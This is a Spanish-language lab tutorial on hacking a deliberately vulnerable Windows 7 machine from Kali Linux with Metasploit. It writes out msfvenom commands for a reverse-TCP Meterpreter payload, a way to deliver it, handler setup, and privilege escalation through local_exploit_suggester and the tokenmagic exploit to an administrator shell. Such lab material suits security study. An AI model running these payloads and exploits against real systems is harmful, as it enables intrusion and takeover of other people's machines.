Maquinas que vamos a utilizar **Kali Linux y Windows 7 Vulnerable** [https://drive.google.com/file/d/11oWEHwqu9AOKNwBU483abdGhnxJaZKT5/view?usp=sharing](https://drive.google.com/file/d/11oWEHwqu9AOKNwBU483abdGhnxJaZKT5/view?usp=sharing)

  

Metasploit cuenta con un módulo realmente interesante que nos permite realizar una enumeración automática de exploits que podemos utilizar en la máquina objetivo para poder escalar privilegios.

  

- Vamos a hacer una intrusión en la Maquina Windows par poder empezar la escalada de privilegios.
    - Creamos un Payload con msfvenom .
        
        ```Bash
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.3.4 LPORT=4444 -f exe -o virus.exe
        ```
        
        ![[Imagenes/image 59.png|image 59.png]]
        
        `windows/meterpreter/reverser_tcp` como vemos estoy cargando una sesión de meterpreter por que si queremos escalar privilegios con metasploit es muy importante recibir un meterpreter.
        
        Si al ejecutar el payload recibimos un error que que la arquitectura de bits no es compatible esto es debido a que la maquina victima tiene una arquitectura de 64 o de 32 bits y esto habría que diferenciarlo. Esto lo solucionamos volviendo a crear el payload en 64 bits pero indicándole la arquitectura de esta manera:
        
        ```Bash
        msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.3.4 LPORT=4444 -f exe -o virus64.exe
        ```
        
          
        
          
        
- Montamos un servidor en Python desde el puerto 80
    
    ```Bash
    python3 -m http.server 80
    ```
    
    ![[Imagenes/image 1 48.png|image 1 48.png]]
    

  

- Vamos a cargar el virus.exe en la maquina victima a través del explorador web.
    
    ![[Imagenes/image 2 47.png|image 2 47.png]]
    

  

- Abrimos el Metasploit para ponernos a la escucha con el **Multi/Handler**
    
    `use /multi/handler`
    
    ![[Imagenes/image 3 46.png|image 3 46.png]]
    

`show options`

`set LHOST 10.0.3.4`

![[Imagenes/image 4 44.png|image 4 44.png]]

  

- Ponemos el mismo Payload que hemos utilizado para el archivo virus. en mi caso
    
    **windows/x64/meterpreter/reverse_tcp**
    
    `set PAYLOAD windows/x64/meterpreter/reverse_tcp`
    
    `run`
    
    ![[Imagenes/image 5 43.png|image 5 43.png]]
    

  

- En la maquina Windows ejecutamos el archivo virus.exe o virus64.exe
    
    ![[Imagenes/image 6 41.png|image 6 41.png]]
    

Y ya tenemos una sesión de meterpreter.

![[Imagenes/image 7 39.png|image 7 39.png]]

---

  

Empezamos con la escalada de privilegios.

  

`background`

![[Imagenes/image 8 37.png|image 8 37.png]]

  

> [!important] `background` se usa para enviar una sesión activa de Meterpreter al segundo plano sin cerrarla. Esto nos permite seguir interactuando con la consola de Metasploit y ejecutar otros comandos mientras la sesión sigue activa en el sistema objetivo.

  

- **Buscamos una opción que tiene Metasploit para automatizar la escalada de privilegios.**
    
    `search local_exploit_suggester`
    
    ![[Imagenes/image 9 34.png|image 9 34.png]]
    
      
    
- Lo seleccionamos y miramos las opciones
    
    `use 0`
    
    ![[Imagenes/image 10 30.png|image 10 30.png]]
    
    Nos pide el **SESSION** ID.
    
- Miramos el SESSION ID de la sesión que tengamos activa y que anteriormente hemos mandado a segundo plano con **background.**
    
    `sessions -l`
    
    ![[Imagenes/image 11 24.png|image 11 24.png]]
    

  

- Le ponemos el numero de SESSION y y miramos que este todo bien
    
    `set SESSION 1`
    
    `show options`
    
    ![[Imagenes/image 12 24.png|image 12 24.png]]
    

  

- Ejecutamos
    
    `run`
    
    ![[Imagenes/image 13 22.png|image 13 22.png]]
    
    Nos recopila un montón de posibles exploit. Lo rojos debemos ignóralos y probar uno a uno los exploit de color verde.
    
    Para no eternizarnos adelanto que este exploit va a funcionar para esta maquina.
    
    `exploit/windows/local/tokenmagic`
    
    ![[Imagenes/image 14 20.png|image 14 20.png]]
    
      
    

**La prueba de cada exploit se haría de la siguiente manera:**

  

`use exploit/windows/local/tokenmagic`

`show options`

![[Imagenes/image 15 17.png|image 15 17.png]]

  

Rellenamos la información que nos pida y cambiamos LPORT por otro ya que el 4444 lo estamos utilizando en la sesión activa.

`set SESSION 1`

`set LHOST 10.0.3.4`

`set LPORT 5555`

![[Imagenes/image 16 14.png|image 16 14.png]]

  

Ejecutamos y nos crea otra sesión de meterpreter como usuario administrador

`run`

![[Imagenes/image 17 11.png|image 17 11.png]]

  

Lanzamos un Shell y miramos que usuario soy

`shell`

`whoami`

![[Imagenes/image 18 9.png|image 18 9.png]]